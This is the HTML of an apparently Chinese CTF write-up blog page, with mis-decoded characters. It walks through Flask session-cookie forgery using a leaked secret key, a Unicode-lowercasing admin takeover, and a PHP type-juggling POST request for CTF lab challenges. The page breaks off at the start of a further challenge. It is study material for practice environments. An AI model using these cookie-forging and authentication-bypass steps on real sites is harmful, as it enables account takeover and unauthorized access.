&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-html" data-lang="html"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&amp;lt;!-- https://github.com/woadsl1234/hctf_flask/ --&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç½‘ç«™ä½¿ç”¨çš„æ˜¯flaskæ¡†æ¶ï¼Œå…·ä½“è·¯ç”±è¡¨å¦‚ä¸‹&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-python" data-lang="python"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#a6e22e"&gt;@app.route&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;/code&amp;#39;&lt;/span&gt;) &lt;span style="color:#75715e"&gt;#äºŒç»´ç &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;get_code&lt;/span&gt;():
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#a6e22e"&gt;@app.route&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;/index&amp;#39;&lt;/span&gt;) &lt;span style="color:#75715e"&gt;#é¦–é¡µ&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;index&lt;/span&gt;():
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#a6e22e"&gt;@app.route&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;/register&amp;#39;&lt;/span&gt;, methods &lt;span style="color:#f92672"&gt;=&lt;/span&gt; [&lt;span style="color:#e6db74"&gt;&amp;#39;GET&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;POST&amp;#39;&lt;/span&gt;]) &lt;span style="color:#75715e"&gt;#æ³¨å†Œ&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;register&lt;/span&gt;():
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#a6e22e"&gt;@app.route&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;/login&amp;#39;&lt;/span&gt;, methods &lt;span style="color:#f92672"&gt;=&lt;/span&gt; [&lt;span style="color:#e6db74"&gt;&amp;#39;GET&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;POST&amp;#39;&lt;/span&gt;]) &lt;span style="color:#75715e"&gt;#ç™»é™†&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;login&lt;/span&gt;():
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#a6e22e"&gt;@app.route&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;/logout&amp;#39;&lt;/span&gt;) &lt;span style="color:#75715e"&gt;#ç™»å‡º&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;logout&lt;/span&gt;():
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#a6e22e"&gt;@app.route&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;/change&amp;#39;&lt;/span&gt;, methods &lt;span style="color:#f92672"&gt;=&lt;/span&gt; [&lt;span style="color:#e6db74"&gt;&amp;#39;GET&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;POST&amp;#39;&lt;/span&gt;]) &lt;span style="color:#75715e"&gt;#ä¿®æ”¹å¯†ç &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;change&lt;/span&gt;():
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#a6e22e"&gt;@app.route&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;/edit&amp;#39;&lt;/span&gt;, methods &lt;span style="color:#f92672"&gt;=&lt;/span&gt; [&lt;span style="color:#e6db74"&gt;&amp;#39;GET&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;POST&amp;#39;&lt;/span&gt;]) &lt;span style="color:#75715e"&gt;#ç¼–è¾‘ä¿¡æ¯&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;edit&lt;/span&gt;():
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id="è§£æ³•ä¸€flask-sessionä¼ªé€ "&gt;è§£æ³•ä¸€ï¼šflask sessionä¼ªé€ 
&lt;/h2&gt;&lt;p&gt;è¿™ä¸ªè§£æ³•å’Œå‰é¢æŸ¥çœ‹è¯·æ±‚å¤´æ—¶å‘ç°çš„sessionæœ‰å…³ï¼Œflaskæ¡†æ¶æ˜¯é€šè¿‡sessionæ¥åˆ¤æ–­ç™»å½•çš„ç”¨æˆ·èº«ä»½ï¼Œä½†æ˜¯è¿™ä¸ªsessionæ˜¯é€šè¿‡ä¸€äº›å­—ç¬¦ä¸²æ‹¼æ¥ååŠ å¯†çš„ï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬å¯ä»¥çŸ¥é“å­—ç¬¦ä¸²å’ŒåŠ å¯†ç®—æ³•ï¼Œå°±å¯ä»¥å®ç°ä¼ªé€ sessionã€‚&lt;/p&gt;
&lt;p&gt;è´´ä¸¤ç¯‡ç›¸å…³æ–‡ç« ï¼š&lt;/p&gt;
&lt;p&gt;&lt;a class="link" href="https://xz.aliyun.com/t/3569" target="_blank" rel="noopener"
&gt;Python Webä¹‹flask session&amp;amp;æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class="link" href="https://www.leavesongs.com/PENETRATION/client-session-security.html#" target="_blank" rel="noopener"
&gt;å®¢æˆ·ç«¯ session å¯¼è‡´çš„å®‰å…¨é—®é¢˜&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;é¦–å…ˆéœ€è¦æ³¨å†Œä¸€ä¸ªè´¦å·ç™»é™†ä¸Šå»ï¼Œçœ‹çœ‹è¯·æ±‚å¤´Cookieé‡Œçš„sessionå€¼ã€‚&lt;/p&gt;
&lt;p&gt;è¯´æ˜ä¸€ä¸‹flaskçš„sessionå€¼åŠ å¯†æ ¼å¼æ˜¯ï¼š&lt;code&gt;SECRET_KEY&lt;/code&gt; +&lt;code&gt;ä¸€ä¸ªç”¨æˆ·å¯¹è±¡çš„å­—ç¬¦ä¸²&lt;/code&gt;(å°±åƒPHPé‡Œçš„åºåˆ—åŒ–å)ã€‚&lt;code&gt;SECRET_KEY&lt;/code&gt;çš„å€¼æˆ‘ä»¬å¯ä»¥åœ¨æºç é‡Œæ‰¾åˆ°ï¼šhttps://github.com/woadsl1234/hctf_flask/blob/master/app/config.pyä¸­çš„ç¬¬å››è¡Œ&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;SECRET_KEY = os.environ.get(&amp;#39;SECRET_KEY&amp;#39;) or &amp;#39;ckj123&amp;#39;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;å¯ä»¥å¾—çŸ¥&lt;code&gt;SECRET_KEY&lt;/code&gt;å€¼ä¸º&lt;code&gt;ckj123&lt;/code&gt;ã€‚ç„¶ååœ¨index.htmlé¡µé¢å‘ç°åªè¦session[â€˜nameâ€™] == &amp;lsquo;adminâ€™å³å¯ä»¥å¾—åˆ°flagã€‚æ¥ä¸‹æ¥å°±è¦ä½¿ç”¨åˆ°ä¸€ä¸ªè§£å¯†å·¥å…·ï¼Œéœ€è¦è§£å¯†å‡ºç”¨æˆ·å­—ç¬¦ä¸²çš„æ ¼å¼ï¼Œå†å°†ç”¨æˆ·åæ”¹ä¸ºadminï¼ŒåŠ å¯†åå†å»è¯·æ±‚ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä»¥adminçš„èº«ä»½ç™»é™†äº†ã€‚&lt;/p&gt;
&lt;p&gt;å¦‚ä¸‹ &lt;a class="link" href="https://www.leavesongs.com/" target="_blank" rel="noopener"
&gt;&lt;strong&gt;På¸ˆå‚…&lt;/strong&gt;&lt;/a&gt; çš„ç¨‹åºè§£å¯†ï¼š&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-python" data-lang="python"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;#!/usr/bin/env python3&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; sys
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; zlib
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;from&lt;/span&gt; base64 &lt;span style="color:#f92672"&gt;import&lt;/span&gt; b64decode
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;from&lt;/span&gt; flask.sessions &lt;span style="color:#f92672"&gt;import&lt;/span&gt; session_json_serializer
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;from&lt;/span&gt; itsdangerous &lt;span style="color:#f92672"&gt;import&lt;/span&gt; base64_decode
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;decryption&lt;/span&gt;(payload):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; payload, sig &lt;span style="color:#f92672"&gt;=&lt;/span&gt; payload&lt;span style="color:#f92672"&gt;.&lt;/span&gt;rsplit(&lt;span style="color:#e6db74"&gt;b&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;.&amp;#39;&lt;/span&gt;, &lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; payload, timestamp &lt;span style="color:#f92672"&gt;=&lt;/span&gt; payload&lt;span style="color:#f92672"&gt;.&lt;/span&gt;rsplit(&lt;span style="color:#e6db74"&gt;b&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;.&amp;#39;&lt;/span&gt;, &lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; decompress &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;False&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; payload&lt;span style="color:#f92672"&gt;.&lt;/span&gt;startswith(&lt;span style="color:#e6db74"&gt;b&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;.&amp;#39;&lt;/span&gt;):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; payload &lt;span style="color:#f92672"&gt;=&lt;/span&gt; payload[&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;:]
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; decompress &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;True&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;try&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; payload &lt;span style="color:#f92672"&gt;=&lt;/span&gt; base64_decode(payload)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;except&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;Exception&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;as&lt;/span&gt; e:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;raise&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;Exception&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;Could not base64 decode the payload because of &amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;an exception&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; decompress:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;try&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; payload &lt;span style="color:#f92672"&gt;=&lt;/span&gt; zlib&lt;span style="color:#f92672"&gt;.&lt;/span&gt;decompress(payload)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;except&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;Exception&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;as&lt;/span&gt; e:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;raise&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;Exception&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;Could not zlib decompress the payload before &amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;decoding the payload&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; session_json_serializer&lt;span style="color:#f92672"&gt;.&lt;/span&gt;loads(payload)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; __name__ &lt;span style="color:#f92672"&gt;==&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; print(decryption(sys&lt;span style="color:#f92672"&gt;.&lt;/span&gt;argv[&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;]&lt;span style="color:#f92672"&gt;.&lt;/span&gt;encode()))
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ‰§è¡Œå‘½ä»¤&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;python run.py .eJw90MGKwkAMBuBXWXL2YLvuRfAgjBaFpFRGh8lFdK1tpxOFqmwd8d131gVvIX_4SPKA7bErLzWMr92tHMC2OcD4AR97GIPVOKIU-zzDgI4bDAeP2cZhWAcSO0SzcpiuhM26R1OMYi8h4faVSZGyniYYqk8y7FgdmlzFOV1LrufCat6gxpSikRu8WzMLrNqE1CJFXYzYRMmwZ-HahmXNGTkKi7sNbUpq6aP_xcpLrthbZyfwHMD3pTtur-e2PL1PyP_IUAWKS1uZ9Si2JzP3nLGg4NA6TMjYH9bexbonXXsuJi-ukV1VvqVi4xer6X9y2kkMoLqd97tTBQO4Xcru9TlIhvD8BSJwb7A.YELi9g.D_opOsSTFKn3wKeMF1rcGksx5HA
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ç»“æœ&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;{&amp;#39;_fresh&amp;#39;: True, &amp;#39;_id&amp;#39;: b&amp;#39;a387c18c326b37e0ec3536f41dc3dfee11d86f56fd6f42d6e053875fcd7b85118f91fd1b1365dc9c2aa3d95426148ecfefeffac2adcc722c9642e2d9d9f86eb6&amp;#39;, &amp;#39;csrf_token&amp;#39;: b&amp;#39;895783633ba12f15aedff2c4b355f0e9cb3158ee&amp;#39;, &amp;#39;image&amp;#39;: b&amp;#39;AYHD&amp;#39;, &amp;#39;name&amp;#39;: &amp;#39;guobang&amp;#39;, &amp;#39;user_id&amp;#39;: &amp;#39;10&amp;#39;}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ç„¶åæˆ‘ä»¬éœ€è¦å§&lt;code&gt;name&lt;/code&gt;çš„å€¼ä¿®æ”¹ä¸º&lt;code&gt;admin&lt;/code&gt;ã€‚ä¿®æ”¹å®Œæˆä»¥åè¿˜éœ€è¦å›åˆ°åŸæ¥çš„sessionæ ¼å¼ï¼Œé‚£ä¹ˆå°±éœ€è¦ç”¨åˆ°ä¸€ä¸ªåŠ å¯†flaskçš„å·¥å…·ï¼š&lt;a class="link" href="https://github.com/noraj/flask-session-cookie-manager" target="_blank" rel="noopener"
&gt;flask-session-cookie-manager&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;è¿™ä¸ªå·¥å…·ä¹Ÿå¯ä»¥ç”¨æ¥è§£å¯†ã€‚æˆ‘æ•´ç†çš„ä½¿ç”¨æ–¹æ³•å¦‚ä¸‹ï¼Œè®°å¾—è¦ç”¨åŒå¼•å·&lt;code&gt;&amp;quot;&amp;quot;&lt;/code&gt;æ‹¬èµ·æ¥&lt;/p&gt;
&lt;p&gt;python flask_session_cookie_manager{2,3}.py {encode,decode}&lt;/p&gt;
&lt;p&gt;-s &amp;ldquo;SECRET_KEY&amp;rdquo; éƒ½éœ€è¦ä½¿ç”¨
-c &amp;ldquo;Session cookie value&amp;rdquo; sessionçš„å€¼ åªæœ‰è§£å¯†decodeç”¨å¾—åˆ°
-t &amp;ldquo;Session cookie structure&amp;rdquo; cookieç»“æ„ åªæœ‰encodeç”¨å¾—&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;æ‰§è¡Œ&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;python flask_session_cookie_manager3.py encode -s &amp;#34;ckj123&amp;#34; -t &amp;#34;{&amp;#39;_fresh&amp;#39;: True, &amp;#39;_id&amp;#39;: b&amp;#39;a387c18c326b37e0ec3536f41dc3dfee11d86f56fd6f42d6e053875fcd7b85118f91fd1b1365dc9c2aa3d95426148ecfefeffac2adcc722c9642e2d9d9f86eb6&amp;#39;, &amp;#39;csrf_token&amp;#39;: b&amp;#39;895783633ba12f15aedff2c4b355f0e9cb3158ee&amp;#39;, &amp;#39;image&amp;#39;: b&amp;#39;AYHD&amp;#39;, &amp;#39;name&amp;#39;: &amp;#39;admin&amp;#39;, &amp;#39;user_id&amp;#39;: &amp;#39;10&amp;#39;}&amp;#34;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;å¾—åˆ°&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;.eJw90MGKwkAMBuBXWXL2YLvdi-BBGC0KSamMDpOLuNtqO524UJWtI777zrrgLeQPH0nusDv09bmByaW_1iPYtRVM7vD2CROwGjNKcShyDOi4xVB5zLcOwyaQ2DGatcN0LWw2A5oyi72EhLtnJmXKepZgOL6TYceqagsV53QjhV4Iq0WLGlOKRmHwZs08sOoSUssUdZmxiZJhz8KNDauGc3IUljcbupTUykf_g5WXQrG3zk7hMYKvc3_YXb67-vQ6ofgjwzFQXNrKfECxA5mF55wFBcfWYULG_rD2LtYD6cZzOX1yreyP9Usqt365nv0np73EAPaVtCcYwfVc98-_QTKGxy8-U27W.YELpfA.vD1SVCAxOcwOPXc_DbwFqJT1TRg
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;æ”¾åœ¨è¯·æ±‚å¤´ä¸­ï¼Œæ ¼å¼ä¸º&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;cookie: session=åŠ å¯†å†…å®¹
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210306103214.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;h2 id="è§£æ³•äºŒunicodeæ¬ºéª—"&gt;è§£æ³•äºŒï¼šUnicodeæ¬ºéª—
&lt;/h2&gt;&lt;p&gt;ç¬¬äºŒç§æ–¹æ³•æ˜¯åˆ©ç”¨ä»£ç ä¸­çš„strlower()å‡½æ•°çš„ä½¿ç”¨ä¸å½“ã€‚è¿™ä¸ªå‡½æ•°åˆ†åˆ«åœ¨æ³¨å†Œã€ç™»é™†ã€ä¿®æ”¹å¯†ç çš„åœ°æ–¹å‡ºç°ä¸‰æ¬¡ã€‚è¿™ä¸ªæ–¹æ³•çš„æ€è·¯å°±æ˜¯unicodeåŠ å¯†ä¸‰å±‚ï¼Œåœ¨æœ€åä¸€å±‚ä¿®æ”¹å¯†ç æ—¶æ‰§è¡Œå‡½æ•°strlower()åä¿®æ”¹åˆ°adminçš„å¯†ç ã€‚è¿‡ç¨‹ä¸º&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;á´¬á´°á´¹á´µá´º&amp;mdash;&amp;mdash;æ³¨å†Œå&amp;mdash;&amp;mdash;&amp;gt;ADMIN&amp;mdash;ä¿®æ”¹å¯†ç &amp;mdash;&amp;gt;admin&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;payload&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;á´¬á´°á´¹á´µá´º
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;æ³¨å†Œä»¥åä½¿ç”¨&lt;code&gt;á´¬á´°á´¹á´µá´º&lt;/code&gt;ç™»é™†ï¼Œç„¶åä¿®æ”¹å¯†ç æ—¶å®é™…ä¿®æ”¹çš„å°±æ˜¯adminçš„å¯†ç äº†ï¼Œç„¶åç™»é™†adminå³å¯ã€‚&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id="æå®¢å¤§æŒ‘æˆ˜-2019buyflag"&gt;[æå®¢å¤§æŒ‘æˆ˜ 2019]BuyFlag
&lt;/h1&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210121104213.png"
loading="lazy"
&gt;ç½‘ç«™é¢˜ç›´æ¥å»çœ‹æºç ï¼Œåœ¨æºç ä¹Ÿæœç´¢phpæœ‰ä¸¤ä¸ªï¼šindex.phpã€pay.phpã€‚å‰è€…æ˜¯é¦–é¡µï¼Œç›´æ¥çœ‹åé¢çš„é‚£ä¸ªï¼Œæ‰“å¼€å°±æœ‰æç¤º&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Only Cuit&amp;rsquo;s students can buy the FLAG&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;åº”è¯¥è¿˜æ˜¯ä¸€é“httpçš„å¥—å¨ƒé¢˜ã€‚æŸ¥çœ‹ç½‘é¡µçš„è¯·æ±‚å‘ç°Cookieä¸­æœ‰ä¸€ä¸ªuser=0ï¼Œå¾ˆå¯ç–‘ï¼Œæ”¹æˆuser=1ï¼Œæœ‰äº†ä¸‹ä¸€ä¸ªæç¤ºï¼šè¾“å…¥å¯†ç ï¼Œå¹¶ä¸”æºç ä¸­æœ‰ä¸€æ®µphp&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;!--
~~~post money and password~~~
if (isset($_POST[&amp;#39;password&amp;#39;])) {
$password = $_POST[&amp;#39;password&amp;#39;];
if (is_numeric($password)) {
echo &amp;#34;password can&amp;#39;t be number&amp;lt;/br&amp;gt;&amp;#34;;
}elseif ($password == 404) {
echo &amp;#34;Password Right!&amp;lt;/br&amp;gt;&amp;#34;;
}
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;è¿˜è®°å¾—php&lt;code&gt;==&lt;/code&gt;å…³ç³»è¿ç®—ä¼šå¼ºåˆ¶è½¬æ¢ç±»å‹ï¼Œç”¨POSTä¼ ä¸€ä¸ªpassword=404aï¼Œ&lt;code&gt;404a&lt;/code&gt;ä¼šè¢«å¼ºåˆ¶è½¬æ¢ä¸º&lt;code&gt;404&lt;/code&gt;ï¼Œå¯†ç å°±å¯¹ä¸Šäº†ã€‚æ¥ä¸‹æ¥æ˜¯é’±çš„é—®é¢˜ï¼Œflagéœ€è¦&lt;strong&gt;100000000&lt;/strong&gt;å—é’±æˆ‘ä»¬ä¹Ÿå»è¦ä¼ è¿‡å»ã€‚å¦‚æœç›´æ¥ä¼ å…¥è¿™ä¹ˆé•¿çš„ä¼šæç¤ºå­—ç¬¦ä¸²è¿‡é•¿ï¼Œæ‰€ä»¥æˆ‘æƒ³åˆ°äº†ç§‘å­¦è®¡æ•°æ³•ï¼Œ&lt;code&gt;10e10&lt;/code&gt;ï¼Œå°±æ˜¯10çš„10æ¬¡æ–¹ï¼Œé€šè¿‡ã€‚æœ€ç»ˆçš„è¯·æ±‚ï¼š&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;POST /pay.php HTTP/1.1
Host: 268f365e-648d-477c-ba25-0c56572cc31f.node3.buuoj.cn
Content-Length: 25
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://268f365e-648d-477c-ba25-0c56572cc31f.node3.buuoj.cn
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://268f365e-648d-477c-ba25-0c56572cc31f.node3.buuoj.cn/pay.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: user=1
Connection: close
password=404a&amp;amp;money=10e10
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;h1 id="suctf-2019checkin"&gt;[SUCTF 2019]CheckIn
&lt;/h1&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210201103750.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;çŸ¥è¯†ç‚¹&lt;/p&gt;
&lt;blockquote&gt;
